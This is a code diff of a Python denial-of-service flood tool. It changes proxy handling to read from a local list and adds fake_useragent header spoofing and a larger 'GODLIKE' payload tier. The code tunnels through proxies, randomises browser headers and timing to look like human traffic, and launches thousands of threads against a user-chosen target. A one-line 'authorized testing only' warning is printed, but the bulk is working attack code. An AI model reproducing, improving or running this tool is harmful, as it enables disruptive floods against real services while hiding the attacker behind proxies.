@@ -9,15 +9,14 @@ import sys
 import select
 import ssl
 import logging
-import requests
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 try:
     from colorama import Fore, init
-    from bs4 import BeautifulSoup
+    from fake_useragent import UserAgent
     init(autoreset=True)
 except ModuleNotFoundError as e:
-    print(f"Error: {e}. Install required packages: 'pip install requests colorama beautifulsoup4'")
+    print(f"Error: {e}. Please install colorama and fake_useragent using 'pip install colorama fake_useragent'")
     exit()
 
 # Configure logging
@@ -27,8 +26,9 @@ stop_attack = threading.Event()
 success_count = 0
 total_bytes_sent = 0
 ssl_failures = 0
-proxy_failures = 0
-valid_proxies = []
+active_proxies = []
+proxy_lock = threading.Lock()
+ua = UserAgent()
 
 # Clear screen
 def clear_text():
@@ -37,10 +37,11 @@ def clear_text():
 # Generate random URL path
 def generate_url_path():
     endpoints = [
-        f"blog/post/{random.randint(1, 1000)}",
-        f"api/v1/{random.choice(['users', 'products', 'orders'])}",
-        f"search?q={generate_random_string(12)}",
-        f"static/{generate_random_string(10)}.css",
+        f"page/{random.randint(1, 1000)}",
+        f"api/{random.choice(['user', 'product', 'cart', 'order'])}/{generate_random_string(8)}",
+        f"search?q={generate_random_string(10)}",
+        f"assets/{generate_random_string(12)}.js",
+        f"content/{generate_random_string(6)}.html",
     ]
     return random.choice(endpoints)
 
@@ -51,283 +52,239 @@ def generate_random_string(length):
 
 # Generate large payload
 def generate_large_payload(size=1024):
-    if size <= 8192:
-        return f"data={generate_random_string(size-5)}"
-    return f'{{"data":"{generate_random_string(size-10)}"}}'
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
+
+# Load and test proxies
+def load_proxies(filename="ProxyList.txt"):
+    global active_proxies
+    try:
+        with open(filename, 'r') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+        logging.info(f"Loaded {len(proxies)} proxies from {filename}")
+        active_proxies = []
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(test_proxy, proxy) for proxy in proxies]
+            for future in futures:
+                future.result()
+        logging.info(f"Found {len(active_proxies)} active proxies")
+    except FileNotFoundError:
+        logging.error(f"ProxyList.txt not found")
+        sys.exit(1)
+
+def test_proxy(proxy):
+    ip, port = proxy.split(':')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    try:
+        s.connect((ip, int(port)))
+        with proxy_lock:
+            active_proxies.append(proxy)
+        logging.debug(f"Proxy {proxy} is active")
+    except (socket.error, ValueError):
+        logging.debug(f"Proxy {proxy} failed")
+    finally:
+        s.close()
+
+# Get random proxy
+def get_random_proxy():
+    with proxy_lock:
+        return random.choice(active_proxies) if active_proxies else None
 
 # Header lists for randomization
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
-]
 accepts = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "application/json,text/plain,*/*",
+    "*/*",
 ]
-accept_languages = ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"]
-accept_encodings = ["gzip, deflate, br", "gzip, deflate"]
+accept_languages = ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"]
+accept_encodings = ["gzip, deflate, br", "gzip, deflate", "br"]
 referers = [
     "https://www.google.com/",
     "https://www.bing.com/",
     f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}/",
 ]
-content_types = ["application/x-www-form-urlencoded", "application/json"]
-cookies = [f"session={generate_random_string(20)}", f"token={generate_random_string(40)}"]
-
-# Download proxy lists
-def download_proxies():
-    proxies = set()
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000",
-        "https://www.free-proxy-list.net/",
-        "https://www.spys.one/en/http-proxy-list/",
-    ]
-    # ProxyScrape
-    try:
-        response = requests.get(sources[0], timeout=10)
-        if response.status_code == 200:
-            proxies.update(line.strip() for line in response.text.splitlines() if line.strip())
-            logging.info(f"Downloaded {len(proxies)} proxies from ProxyScrape")
-    except Exception as e:
-        logging.error(f"Error downloading from ProxyScrape: {e}")
-    # FreeProxyList
-    try:
-        response = requests.get(sources[1], timeout=10)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        table = soup.find('table', id='proxylisttable')
-        for row in table.find_all('tr')[1:]:
-            cols = row.find_all('td')
-            if len(cols) > 1:
-                ip = cols[0].text.strip()
-                port = cols[1].text.strip()
-                proxies.add(f"{ip}:{port}")
-        logging.info(f"Downloaded {len(proxies)} proxies from FreeProxyList")
-    except Exception as e:
-        logging.error(f"Error downloading from FreeProxyList: {e}")
-    # Spys.one
-    try:
-        response = requests.get(sources[2], timeout=10)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        table = soup.find('table', {'class': 'spy1xx'})
-        for row in table.find_all('tr')[2:]:
-            cols = row.find_all('td')
-            if len(cols) > 1:
-                ip_port = cols[0].text.strip()
-                if ':' in ip_port:
-                    proxies.add(ip_port)
-        logging.info(f"Downloaded {len(proxies)} proxies from Spys.one")
-    except Exception as e:
-        logging.error(f"Error downloading from Spys.one: {e}")
-    # Save proxies
-    with open('proxies.txt', 'w') as f:
-        for proxy in proxies:
-            f.write(f"{proxy}\n")
-    return list(proxies)
-
-# Validate proxy
-def validate_proxy(proxy):
-    try:
-        start_time = time.time()
-        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        response = requests.get("http://icanhazip.com", proxies=proxies, timeout=5)
-        if response.status_code == 200:
-            latency = (time.time() - start_time) * 1000  # ms
-            if latency < 500:
-                logging.info(f"Valid proxy: {proxy} (latency: {latency:.2f}ms)")
-                return proxy
-    except Exception:
-        pass
-    return None
-
-# Validate proxies
-def validate_proxies(proxies):
-    global valid_proxies
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        results = executor.map(validate_proxy, proxies)
-        valid_proxies = [proxy for proxy in results if proxy]
-    with open('valid_proxies.txt', 'w') as f:
-        for proxy in valid_proxies:
-            f.write(f"{proxy}\n")
-    logging.info(f"Validated {len(valid_proxies)} proxies")
+content_types = ["application/x-www-form-urlencoded", "multipart/form-data", "application/json"]
+origins = [f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}"]
 
 # Attack logic
-def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False, proxies=None, retries=3):
-    global success_count, total_bytes_sent, ssl_failures, proxy_failures
+def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False):
+    global success_count, total_bytes_sent, ssl_failures
     if stop_attack.is_set():
         return
     url_path = generate_url_path()
-    attempt = 0
-    proxy = random.choice(proxies) if proxies else None
-    while attempt < retries and not stop_attack.is_set():
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(30)
-        if use_ssl:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-            ciphers = [
-                'TLS_AES_256_GCM_SHA384',
-                'TLS_AES_128_GCM_SHA256',
-                'ECDHE-RSA-AES256-GCM-SHA384',
-                'ECDHE-ECDSA-AES256-GCM-SHA384',
-            ]
-            context.set_ciphers(ciphers[attempt % len(ciphers)])
-            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
-            s = context.wrap_socket(s, server_hostname=host)
-        try:
-            if proxy:
-                proxy_ip, proxy_port = proxy.split(':')[:2]
-                s.connect((proxy_ip, int(proxy_port)))
-                connect_request = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
-                s.sendall(connect_request)
-                response = s.recv(4096).decode()
-                if "200 Connection established" not in response:
-                    proxy_failures += 1
-                    logging.error(f"Proxy error: {proxy} failed to connect")
-                    attempt += 1
-                    continue
-            else:
-                s.connect((ip, port))
-            payload_patterns = {
-                'BASIC': (
-                    f"{type_attack} /{url_path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"User-Agent: {random.choice(user_agents)}\r\n"
-                    f"Accept: {random.choice(accepts)}\r\n"
-                    f"Accept-Language: {random.choice(accept_languages)}\r\n"
-                    f"Accept-Encoding: {random.choice(accept_encodings)}\r\n"
-                    f"Referer: {random.choice(referers)}\r\n"
-                    f"Cookie: {random.choice(cookies)}\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n"
-                    f"Sec-Fetch-Dest: document\r\n"
-                    f"DNT: 1\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n"
-                    f"Content-Type: {random.choice(content_types)}\r\n"
-                    f"Content-Length: {len(generate_large_payload(1024))}\r\n\r\n"
-                    f"{generate_large_payload(1024)}"
-                ),
-                'MEDIUM': (
-                    f"{type_attack} /{url_path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"User-Agent: {random.choice(user_agents)}\r\n"
-                    f"Accept: {random.choice(accepts)}\r\n"
-                    f"Accept-Language: {random.choice(accept_languages)}\r\n"
-                    f"Accept-Encoding: {random.choice(accept_encodings)}\r\n"
-                    f"Referer: {random.choice(referers)}\r\n"
-                    f"Cookie: {random.choice(cookies)}\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n"
-                    f"Sec-Fetch-Dest: document\r\n"
-                    f"DNT: 1\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n"
-                    f"Content-Type: {random.choice(content_types)}\r\n"
-                    f"Content-Length: {len(generate_large_payload(8192))}\r\n\r\n"
-                    f"{generate_large_payload(8192)}"
-                ),
-                'INSANE': (
-                    f"{type_attack} /{url_path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"User-Agent: {random.choice(user_agents)}\r\n"
-                    f"Accept: {random.choice(accepts)}\r\n"
-                    f"Accept-Language: {random.choice(accept_languages)}\r\n"
-                    f"Accept-Encoding: {random.choice(accept_encodings)}\r\n"
-                    f"Referer: {random.choice(referers)}\r\n"
-                    f"Cookie: {random.choice(cookies)}\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n"
-                    f"Sec-Fetch-Dest: document\r\n"
-                    f"DNT: 1\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n"
-                    f"Content-Type: {random.choice(content_types)}\r\n"
-                    f"Content-Length: {len(generate_large_payload(32768))}\r\n\r\n"
-                    f"{generate_large_payload(32768)}"
-                ),
-                'EXTREME': (
-                    f"{type_attack} /{url_path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"User-Agent: {random.choice(user_agents)}\r\n"
-                    f"Accept: {random.choice(accepts)}\r\n"
-                    f"Accept-Language: {random.choice(accept_languages)}\r\n"
-                    f"Accept-Encoding: {random.choice(accept_encodings)}\r\n"
-                    f"Referer: {random.choice(referers)}\r\n"
-                    f"Cookie: {random.choice(cookies)}\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n"
-                    f"Sec-Fetch-Dest: document\r\n"
-                    f"DNT: 1\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n"
-                    f"Content-Type: {random.choice(content_types)}\r\n"
-                    f"Content-Length: {len(generate_large_payload(65536))}\r\n\r\n"
-                    f"{generate_large_payload(65536)}"
-                ),
-                'ULTIMATE': (
-                    f"{type_attack} /{url_path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"User-Agent: {random.choice(user_agents)}\r\n"
-                    f"Accept: {random.choice(accepts)}\r\n"
-                    f"Accept-Language: {random.choice(accept_languages)}\r\n"
-                    f"Accept-Encoding: {random.choice(accept_encodings)}\r\n"
-                    f"Referer: {random.choice(referers)}\r\n"
-                    f"Cookie: {random.choice(cookies)}\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n"
-                    f"Sec-Fetch-Dest: document\r\n"
-                    f"DNT: 1\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n"
-                    f"Content-Type: {random.choice(content_types)}\r\n"
-                    f"Content-Length: {len(generate_large_payload(131072))}\r\n\r\n"
-                    f"{generate_large_payload(131072)}"
-                ),
-            }
-            packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
-            sent_bytes = 0
-            for _ in range(booster_sent):
-                if stop_attack.is_set():
-                    break
-                s.sendall(packet_data)
-                sent_bytes += len(packet_data)
-                time.sleep(random.uniform(0.5, 2))
+    proxy = get_random_proxy()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(30)  # 30s timeout for proxy and HTTPS
+    if use_ssl:
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:TLS_AES_256_GCM_SHA384')
+        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or higher
+        s = context.wrap_socket(s, server_hostname=host)
+    try:
+        if proxy:
+            proxy_ip, proxy_port = proxy.split(':')
+            s.connect((proxy_ip, int(proxy_port)))
+            connect_request = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode()
+            s.sendall(connect_request)
+            response = s.recv(4096).decode()
+            if "200 Connection established" not in response:
+                raise ConnectionError(f"Proxy {proxy} failed to establish connection")
+        else:
+            s.connect((ip, port))
+        payload_patterns = {
+            'BASIC': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 1024\n\n"
+                f"{generate_large_payload(1024)}"
+            ),
+            'MEDIUM': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 8192\n\n"
+                f"{generate_large_payload(8192)}"
+            ),
+            'INSANE': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 32768\n\n"
+                f"{generate_large_payload(32768)}"
+            ),
+            'EXTREME': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 65536\n\n"
+                f"{generate_large_payload(65536)}"
+            ),
+            'ULTIMATE': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 131072\n\n"
+                f"{generate_large_payload(131072)}"
+            ),
+            'GODLIKE': (
+                f"{type_attack} /{url_path} HTTP/1.1\n"
+                f"Host: {host}\n"
+                f"Connection: keep-alive\n"
+                f"User-Agent: {ua.random}\n"
+                f"Accept: {random.choice(accepts)}\n"
+                f"Accept-Language: {random.choice(accept_languages)}\n"
+                f"Accept-Encoding: {random.choice(accept_encodings)}\n"
+                f"Referer: {random.choice(referers)}\n"
+                f"Origin: {random.choice(origins)}\n"
+                f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
+                f"Sec-Fetch-Site: cross-site\n"
+                f"Sec-Fetch-Mode: navigate\n"
+                f"DNT: 1\n"
+                f"Upgrade-Insecure-Requests: 1\n"
+                f"Content-Type: {random.choice(content_types)}\n"
+                f"Content-Length: 262144\n\n"
+                f"{generate_large_payload(262144)}"
+            ),
+        }
+        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
+        sent_bytes = 0
+        for _ in range(booster_sent):
+            if stop_attack.is_set():
+                break
+            s.sendall(packet_data)
+            sent_bytes += len(packet_data)
+            time.sleep(random.uniform(0.05, 1.0))  # Random delay to mimic human behavior
+        with proxy_lock:
             success_count += 1
             total_bytes_sent += sent_bytes
-            logging.info(f"Success: Sent {sent_bytes / 1024:.2f} KB to {ip}:{port} via {proxy or 'direct'}")
-            break
-        except ssl.SSLEOFError as e:
+        logging.info(f"Successful connection via {proxy or 'direct'}: Sent {sent_bytes / 1024:.2f} KB to {ip}:{port}")
+    except ssl.SSLEOFError as e:
+        with proxy_lock:
             ssl_failures += 1
-            logging.error(f"SSL EOF error on {ip}:{port} via {proxy or 'direct'}: {str(e)} (attempt {attempt + 1})")
-            attempt += 1
-            time.sleep(1)
-        except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
-            proxy_failures += 1 if proxy else 0
-            logging.error(f"Error on {ip}:{port} via {proxy or 'direct'}: {type(e).__name__} - {str(e)}")
-            break
-        finally:
-            s.close()
+        logging.error(f"SSL EOF error on {ip}:{port} via {proxy or 'direct'}: {str(e)}")
+    except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
+        logging.error(f"Attack error on {ip}:{port} via {proxy or 'direct'}: {type(e).__name__} - {str(e)}")
+    finally:
+        s.close()
 
-# Running attack
+# Running attack with ThreadPoolExecutor
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
-    global valid_proxies
     with ThreadPoolExecutor(max_workers=min(spam_loader, 20)) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
-            proxy = random.choice(valid_proxies) if valid_proxies else None
-            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl, valid_proxies) for _ in range(spam_loader)]
+            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
             for future in futures:
                 future.result()
 
-# Countdown timer
+# Countdown + interrupt
 def countdown_timer(time_loader):
-    global total_bytes_sent, ssl_failures, proxy_failures
+    global total_bytes_sent, ssl_failures
     start_time = time.time()
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
         elapsed = time.time() - start_time
         traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
-        sys.stdout.write(f"\r{Fore.YELLOW}Time: {remaining}s | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxy Failures: {proxy_failures} | Total: {total_bytes_sent / 1024 / 1024:.2f} MB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
+        sys.stdout.write(f"\r{Fore.YELLOW}Time: {remaining}s | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxies: {len(active_proxies)} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         sys.stdout.flush()
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
@@ -338,7 +295,7 @@ def countdown_timer(time_loader):
         remaining = int(time_loader - time.time())
     if not stop_attack.is_set():
         traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
-        print(f"\n{Fore.GREEN}Attack completed | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxy Failures: {proxy_failures} | Total: {total_bytes_sent / 1024 / 1024:.2f} MB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
+        print(f"\n{Fore.GREEN}Attack completed | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxies: {len(active_proxies)} | Total: {total_bytes_sent / 1024 / 1024:.2f} MB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         stop_attack.set()
 
 # Exit confirmation
@@ -352,10 +309,10 @@ def confirm_exit():
             print()
             return
 
-# Validate target
+# Validate URL and extract host, protocol
 def validate_target(target):
     try:
-        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'https://{target}')
+        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
         host = parsed.hostname
         if not host:
             raise ValueError("Invalid URL")
@@ -369,16 +326,11 @@ def validate_target(target):
 
 # Main command loop
 def command():
-    global stop_attack, success_count, total_bytes_sent, ssl_failures, proxy_failures
+    global stop_attack, success_count, total_bytes_sent, ssl_failures
     print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
-    proxies = download_proxies()
-    if not proxies:
-        print(f"{Fore.RED}No proxies downloaded. Exiting...{Fore.RESET}")
-        sys.exit(1)
-    print(f"{Fore.YELLOW}Validating {len(proxies)} proxies...{Fore.RESET}")
-    validate_proxies(proxies)
-    if not valid_proxies:
-        print(f"{Fore.RED}No valid proxies found. Exiting...{Fore.RESET}")
+    load_proxies()
+    if not active_proxies:
+        print(f"{Fore.RED}No active proxies found. Exiting...{Fore.RESET}")
         sys.exit(1)
     while True:
         try:
@@ -386,14 +338,15 @@ def command():
             if not data_input_loader:
                 confirm_exit()
                 continue
+
             args_get = data_input_loader.split()
             if args_get[0].lower() == "clear":
                 clear_text()
             elif args_get[0].upper() == "!FLOOD":
                 if len(args_get) == 10:
                     data_type_loader_packet = args_get[1].upper()
-                    if data_type_loader_packet not in ['BASIC', 'MEDIUM', 'INSANE', 'EXTREME', 'ULTIMATE']:
-                        print(f"{Fore.RED}TYPE_PACKET must be BASIC, MEDIUM, INSANE, EXTREME, or ULTIMATE{Fore.RESET}")
+                    if data_type_loader_packet not in ['BASIC', 'MEDIUM', 'INSANE', 'EXTREME', 'ULTIMATE', 'GODLIKE']:
+                        print(f"{Fore.RED}TYPE_PACKET must be BASIC, MEDIUM, INSANE, EXTREME, ULTIMATE, or GODLIKE{Fore.RESET}")
                         continue
                     target_loader = args_get[2]
                     try:
@@ -411,14 +364,14 @@ def command():
                     try:
                         spam_loader = int(args_get[5])
                         if spam_loader > 5000:
-                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 5000 may overload your system.{Fore.RESET}")
+                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 5000 may overload your system. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
                         continue
                     try:
                         create_thread = int(args_get[6])
                         if create_thread > 5000:
-                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 5000 may overload your system.{Fore.RESET}")
+                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 5000 may overload your system. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
                         continue
@@ -431,23 +384,26 @@ def command():
                     try:
                         spam_create_thread = int(args_get[9])
                         if spam_create_thread > 5000:
-                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 5000 may overload your system.{Fore.RESET}")
+                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 5000 may overload your system. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
                         continue
+
                     ip, host, use_ssl = validate_target(target_loader)
                     if not ip:
                         print(f"{Fore.YELLOW}Invalid target or unable to resolve URL{Fore.RESET}")
                         continue
+
                     stop_attack.clear()
                     success_count = 0
                     total_bytes_sent = 0
                     ssl_failures = 0
-                    proxy_failures = 0
-                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}\nValid Proxies: {len(valid_proxies)}{Fore.RESET}")
+                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}\nProxies: {len(active_proxies)}{Fore.RESET}")
+
                     for _ in range(create_thread):
                         for _ in range(spam_create_thread):
                             threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl)).start()
+
                     countdown_timer(time_loader)
                     continue
                 else:
